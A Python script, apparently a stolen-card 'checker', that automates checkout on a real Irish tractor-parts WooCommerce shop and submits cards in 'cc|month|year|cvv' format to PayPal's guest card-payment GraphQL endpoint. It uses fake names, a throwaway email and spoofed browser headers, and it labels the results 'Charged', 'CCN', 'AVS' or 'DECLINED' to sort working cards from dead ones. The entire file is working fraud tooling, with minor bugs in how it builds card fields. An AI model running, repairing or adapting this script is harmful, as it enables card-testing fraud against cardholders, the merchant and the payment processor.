
import base64
import requests
import random
import json
import names
from random_address import real_random_address
from bs4 import BeautifulSoup
import uuid
import re



direc = real_random_address()

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session


def find_between(data, first, last):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None  

zipcode = direc['postalCode']
try:
    city = direc['city']
except KeyError:
    city = 'NY'
state = direc['state']
street = direc['address1']

class paypal1:
    def __init__(self, tarjeta):
        partes = tarjeta.split("|")
        
        self.tarjeta = tarjeta
        if len(partes) == 4:
            self.cc = partes[0]
            self.mes = partes[1]
            self.ano = partes[2]
            self.cvv = partes[3]
        self.username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
        self.CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
        self.Password = f"{names.get_first_name()}{names.get_last_name()}#{random.randint(1000000,9999999)}"
        
        
        
    def detectar_tipo_tarjeta(self):
        if self.cc.startswith("4"):
            return "Visa"
        elif self.cc.startswith("5"):
            return "MasterCard"
        elif self.cc.startswith("3"):
            return "American Express"
        elif self.cc.startswith("6"):
            return "Discover"
        else:
            return "Desconocido"
        
        
        
    def main(self):
        try:
            session = requests.Session()
            guid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
            muid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
            sid = str(uuid.uuid4()).replace('-', '') + '438b7a'

            headers = {
                'Accept': '*/*',
                'Accept-Language': 'es-ES,es;q=0.5',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://tractorspares.ie',
                'Referer': 'https://tractorspares.ie/shop/uncategorized/instrument-panel-rubber-gasket/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-GPC': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                # 'Cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-02-22%2003%3A47%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Ftractorspares.ie%2Fproduct-category%2Fford%2F1000-series%2F5000%2Fpto-parts-for-5000%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-02-22%2003%3A47%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Ftractorspares.ie%2Fproduct-category%2Fford%2F1000-series%2F5000%2Fpto-parts-for-5000%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F145.0.0.0%20Safari%2F537.36; wp_woocommerce_session_f66d3d8905dd191b71d312dc5ae6c547=t_15e29ee47c2076f158493e0386b299%7C1771904927%7C1771818527%7C%24generic%24JSBxkv_FdfjppSkGjPJuZkJ_pH-KRj6e_zEBo8Zr; __stripe_mid=fee0e897-30ed-4327-80c1-d8d4ef6312f826e802; __stripe_sid=d5178402-7892-4f6a-a6ed-f6dd99fc73478e94e5; sbjs_session=pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftractorspares.ie%2Fshop%2Funcategorized%2Finstrument-panel-rubber-gasket%2F',
            }

            params = {
                'wc-ajax': 'add_to_cart',
            }

            data = {
                'quantity': '1',
                'product_id': '11280',
            }

            response = session.post('https://tractorspares.ie/', params=params,  headers=headers, data=data).text
            cart_hash = find_between(response, 'cart_hash":"','"')
            print(cart_hash)
            
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'es-ES,es;q=0.5',
                'Connection': 'keep-alive',
                'Referer': 'https://tractorspares.ie/shop/uncategorized/instrument-panel-rubber-gasket/',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Sec-GPC': '1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                # 'Cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-02-22%2003%3A47%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Ftractorspares.ie%2Fproduct-category%2Fford%2F1000-series%2F5000%2Fpto-parts-for-5000%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-02-22%2003%3A47%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Ftractorspares.ie%2Fproduct-category%2Fford%2F1000-series%2F5000%2Fpto-parts-for-5000%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F145.0.0.0%20Safari%2F537.36; wp_woocommerce_session_f66d3d8905dd191b71d312dc5ae6c547=t_15e29ee47c2076f158493e0386b299%7C1771904927%7C1771818527%7C%24generic%24JSBxkv_FdfjppSkGjPJuZkJ_pH-KRj6e_zEBo8Zr; __stripe_mid=fee0e897-30ed-4327-80c1-d8d4ef6312f826e802; __stripe_sid=d5178402-7892-4f6a-a6ed-f6dd99fc73478e94e5; sbjs_session=pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftractorspares.ie%2Fshop%2Funcategorized%2Finstrument-panel-rubber-gasket%2F; woocommerce_items_in_cart=1; woocommerce_cart_hash=8ad3252486e8d3bcc74d3e992d35c3a5',
            }

            response = session.get('https://tractorspares.ie/cart/', headers=headers).text
            cart = find_between(response, 'name="woocommerce-cart-nonce" value="', '"')
            print(cart)
                
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'es-ES,es;q=0.5',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Referer': 'https://tractorspares.ie/cart/',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Sec-GPC': '1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                # 'Cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-02-22%2003%3A47%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Ftractorspares.ie%2Fproduct-category%2Fford%2F1000-series%2F5000%2Fpto-parts-for-5000%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-02-22%2003%3A47%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Ftractorspares.ie%2Fproduct-category%2Fford%2F1000-series%2F5000%2Fpto-parts-for-5000%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F145.0.0.0%20Safari%2F537.36; wp_woocommerce_session_f66d3d8905dd191b71d312dc5ae6c547=t_15e29ee47c2076f158493e0386b299%7C1771904927%7C1771818527%7C%24generic%24JSBxkv_FdfjppSkGjPJuZkJ_pH-KRj6e_zEBo8Zr; __stripe_mid=fee0e897-30ed-4327-80c1-d8d4ef6312f826e802; __stripe_sid=d5178402-7892-4f6a-a6ed-f6dd99fc73478e94e5; woocommerce_items_in_cart=1; country=CA; woocommerce_cart_hash=84516635cbac92ca4b4812b550e62573; sbjs_session=pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftractorspares.ie%2Fcheckout%2F',
            }

            response = session.get('https://tractorspares.ie/checkout/',   headers=headers).text
            cehck = find_between(response, 'name="woocommerce-process-checkout-nonce" value="', '"')
            create_or = find_between(response, 'wc-ajax=ppc-create-order","nonce":"', '"')
            print(cehck,create_or)
            
            headers = {
                'Accept': '*/*',
                'Accept-Language': 'es-ES,es;q=0.5',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json',
                'Origin': 'https://tractorspares.ie',
                'Referer': 'https://tractorspares.ie/checkout/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-GPC': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                # 'Cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-02-22%2003%3A47%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Ftractorspares.ie%2Fproduct-category%2Fford%2F1000-series%2F5000%2Fpto-parts-for-5000%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-02-22%2003%3A47%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Ftractorspares.ie%2Fproduct-category%2Fford%2F1000-series%2F5000%2Fpto-parts-for-5000%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F145.0.0.0%20Safari%2F537.36; wp_woocommerce_session_f66d3d8905dd191b71d312dc5ae6c547=t_15e29ee47c2076f158493e0386b299%7C1771904927%7C1771818527%7C%24generic%24JSBxkv_FdfjppSkGjPJuZkJ_pH-KRj6e_zEBo8Zr; __stripe_mid=fee0e897-30ed-4327-80c1-d8d4ef6312f826e802; __stripe_sid=d5178402-7892-4f6a-a6ed-f6dd99fc73478e94e5; woocommerce_items_in_cart=1; country=CA; woocommerce_cart_hash=84516635cbac92ca4b4812b550e62573; sbjs_session=pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftractorspares.ie%2Fcheckout%2F',
            }

            params = {
                'wc-ajax': 'ppc-create-order',
            }

            json_data = {
                'nonce': create_or,
                'payer': None,
                'bn_code': 'Woo_PPCP',
                'context': 'checkout',
                'order_id': '0',
                'order_key': '',
                'payment_method': 'ppcp-gateway',
                'funding_source': 'card',
                'form_encoded': f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Ftractorspares.ie%2Fproduct-category%2Fford%2F1000-series%2F5000%2Fpto-parts-for-5000%2F&wc_order_attribution_session_start_time=2026-02-22+03%3A47%3A58&wc_order_attribution_session_pages=13&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F145.0.0.0+Safari%2F537.36&billing_first_name=ldfl&billing_last_name=dsdasd&billing_company=ggd&billing_country=CA&billing_address_1=moall+del+sol&billing_address_2=sadw&billing_city=guayas&billing_state=ON&billing_postcode=A1A+1A1&billing_phone=%2B10989861371&billing_email=banes42563%40rohoza.com&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=CA&shipping_address_1=&shipping_address_2=&shipping_city=guayas&shipping_state=ON&shipping_postcode=A1A+1A1&order_comments=&sWZ8q=&shipping_method%5B0%5D=flat_rate%3A2&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=&wc-stripe-is-deferred-intent=1&payment_method=ppcp-gateway&woocommerce-process-checkout-nonce={cehck}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
                'createaccount': False,
                'save_payment_method': False,
            }

            response = session.post('https://tractorspares.ie/', params=params,  headers=headers, json=json_data).json()
            id = response['data']['id']
            print(id)
            

            headers = {
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.5',
                'content-type': 'application/json',
                'origin': 'https://www.paypal.com',
                'paypal-client-context': id,
                'paypal-client-metadata-id': id,
                'priority': 'u=1, i',
                'referer': f'https://www.paypal.com/smart/card-fields?token={id}&sessionID=uid_79e70288e5_mdq6ndu6nty&buttonSessionID=uid_b60ee0eacf_mdq6ndu6nty&locale.x=es_ES&commit=true&style.submitButton.display=true&hasShippingCallback=false&env=production&country.x=ES&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QkFBb0hhd1pDYU9oajNGZzdHM2FacEpSTmNJTEVPMGpPaFQwU09aNnBIV095bXo0QXJNWkt1c0wyM0Q4dnVrbUEwTEhKd1Bfbmc1U1pXY1BBMCZjdXJyZW5jeT1FVVImaW50ZWdyYXRpb24tZGF0ZT0yMDI2LTAyLTA1JmNvbXBvbmVudHM9YnV0dG9ucyxmdW5kaW5nLWVsaWdpYmlsaXR5JnZhdWx0PWZhbHNlJmNvbW1pdD10cnVlJmludGVudD1jYXB0dXJlJmVuYWJsZS1mdW5kaW5nPXZlbm1vLHBheWxhdGVyIiwiYXR0cnMiOnsiZGF0YS1wYXJ0bmVyLWF0dHJpYnV0aW9uLWlkIjoiV29vX1BQQ1AiLCJkYXRhLXVpZCI6InVpZF9pc3VjZnJqcmp6a215ZXdlcWNodHFra3N1Y29nangifX0&disable-card=',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-storage-access': 'none',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
                'x-app-name': 'standardcardfields',
                'x-country': 'CA',
                # 'cookie': 'KHcl0EuY7AKSMgfvHl7J5E7hPtK=yaVdKxIAY2U_-eUDPYqw_MGZjsudE8IGGvo16VHfYByngrsVBpVmMexhd9iP4_gIYP-hx5e0W0vQIe71; sc_f=E9Xpa3Rsd4fXnBLCtq7KngBY7NzdxOokOle6RF5atOrNbiZY9chsuo-VrUGacmkJ1sKKdkuXShNpspcWYBuAtOkumrcwMpjaZ2UY6G; _cfuvid=5J854C_YBTlKe6DSxiVtxhGkZ6qFp9jJ6QhkZVzdybE-1771732129064-0.0.1.1-604800000; cf_clearance=XtPNAdQljVCl2skAziX7nYaVnbvpfHJz_J7mfooMyaw-1771735559-1.2.1.1-PDGZE92lb5I2J6iugr1XJfGjv0PEx4ZCzUMN9QYtrR22ThzvFyMum5LeJM67VfeC7Lqvkx6HH8gHIjEnGrNQ.r_TEWVf8blSlqAsCqQeRSM5TPYO4wh28rednrAAyAiixEzmJvHAEDv7fVjY18jK9KFFzxro1G9NxEaBSI9fSBf296oH6LGEHslNwYvSNvgcuSGT4v4pFMEnFZNpSRdvZS.3mJ3CxMGG9nUmJBvp65E; ts_c=vr%3D83afbc4619c0aa381884ff15ff140d06%26vt%3D83afbc4619c0aa381884ff15ff140d05; enforce_policy=ccpa; LANG=en_US%3BCA; nsid=s%3ArvjUZsZ2H2_ctA7hC1Jr3pkUeOxw5Fpa.XVExu3bbfMlYmvgw0Z6DWjf99gSkE0P88AY2F2y6ZPI; ddi=o-rbX_TijUqwmmWcR67JJKLplwBWsJ6qU9yduxIbA4hBhw69PVDv1dyV3fdY2IVSlTVmRDHlYwKqwPrVKXUh-nxC08e6kmSif6nXGiB2b8q3VKwk; l7_az=dcg16.slc; __cf_bm=phuw_TknCkBcnaKM8aeE.SE129j_yHZyHEjeWvxYhvs-1771737034-1.0.1.1-uMikpPb8pmOqFMjTF2SN6HjU6bk7D797wc_n0gT5TKZO5Qp5jLliXmOWM2Kc2B8llEu3siAm0UsvI7voKGnQ5sdDbUu76aGER9JhnCotBV0; login_email=banes42563%40rohoza.com; tsrce=graphqlnodeweb; AV894Kt2TSumQQrJwe-8mzmyREO=S23AANui00pgdBcw8N2XAW0B9NsNvOpN3NDqnPROGhjqbrWx-8igQ0_lakXNnb83rpW8WUr8xaY3QWAQ4hHBeksvgOcM1EgkA; x-pp-s=eyJ0IjoiMTc3MTczNzY1MTA5MCIsImwiOiIwIiwibSI6IjAifQ; ts=vreXpYrS%3D1803273649%26vteXpYrS%3D1771739449%26vr%3D83afbc4619c0aa381884ff15ff140d06%26vt%3D83afbc4619c0aa381884ff15ff140d05%26vtyp%3Dnew',
            }

            json_data = {
                'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n            $feeReferenceId: String\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n                feeReferenceId: $feeReferenceId\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
                'variables': {
                    'token': '07443406J7586144A',
                    'card': {
                        'cardNumber': {self.cc},
                        'type': 'VISA',
                        'expirationDate': f'{self.mes}/{self.ano}',
                        'postalCode': 'A1A 1A1',
                        'securityCode': {self.cvv},
                    },
                    'firstName': 'alfresdo',
                    'lastName': 'dsdasd',
                    'billingAddress': {
                        'givenName': 'alfresdo',
                        'familyName': 'dsdasd',
                        'line1': 'moall del sol',
                        'line2': 'sadw',
                        'city': 'guayas',
                        'state': 'ON',
                        'postalCode': 'A1A 1A1',
                        'country': 'CA',
                    },
                    'email': 'banes42563@rohoza.com',
                    'currencyConversionType': 'PAYPAL',
                },
                'operationName': None,
            }

            response = session.post(
                'https://www.paypal.com/graphql?fetch_credit_form_submit',
                
                headers=headers,
                json=json_data,
            )
            
            try:
                error = response.json()['errors'][0]['data'][0]['code']
            except:
                try:
                    error = re.findall(r'"code":"(\w*)"', response.text)[0]
                except:
                    error = 'Auth challenge' if 'authchallenge' in response.text else 'CARD_ERROR'

            if 'is3DSecureRequired' in response.text:
                return 'Charged✅:$0.7'
            
            elif error == 'INVALID_SECURITY_CODE':
                return 'CCN✅: '+error
            
            elif error == 'EXISTING_ACCOUNT_RESTRICTED':
                return 'True✅: '+error
            
            elif error == 'INVALID_BILLING_ADDRESS':
                return 'AVS✅: '+error
            else:
                return "DECLINED❌: "+error
            
        except: return 'Declined ❌','CARD_GENERIC_ERROR'

           